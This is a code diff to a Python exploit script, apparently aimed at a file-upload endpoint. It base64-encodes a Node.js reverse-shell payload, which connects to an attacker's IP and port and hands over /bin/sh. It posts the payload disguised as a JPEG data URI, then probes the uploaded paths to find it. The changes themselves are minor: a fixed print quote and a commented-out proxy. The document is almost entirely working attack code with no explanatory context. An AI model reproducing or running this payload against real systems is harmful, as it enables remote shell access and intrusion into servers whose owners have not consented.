@@ -13,7 +13,7 @@ def main():
   session = requests.Session()
   b64payload = base64.b64encode(f'!function(){{var e=require("net"),n=require("child_process").spawn("/bin/sh",[]),i=new e.Socket;i.connect({port},"{attacker_ip}",function(){{i.pipe(n.stdin),n.stdout.pipe(i),n.stderr.pipe(i)}})}}();'.encode('utf-8'))
   rawBody = "{\"name\":\"test2.jpg\",\"type\":\"image/jpeg\",\"file\":\"data:image/jpeg;base64,"+ b64payload.decode('utf-8')+"\"}"
-  print("Sent " +rawBody +" payload to the server)
+  print("Sent " + rawBody +" payload to the server")
   headers = {f"Origin":"{target}","X-Requested-With":"XMLHttpRequest","Content-Type":"application/json"}
   session.post(f"http://{target}/", data=rawBody, headers=headers)#,proxies=proxies)
 
@@ -21,7 +21,7 @@ def main():
     alist = [line.rstrip() for line in f]
     for line in alist:
       print("trying "+line)
-      resp=session.get(f"http://{target}/content/{line}.jpg",proxies=proxies)
+      resp=session.get(f"http://{target}/content/{line}.jpg")#,proxies=proxies)
       if "cp.spawn" in resp.text:
         break
             
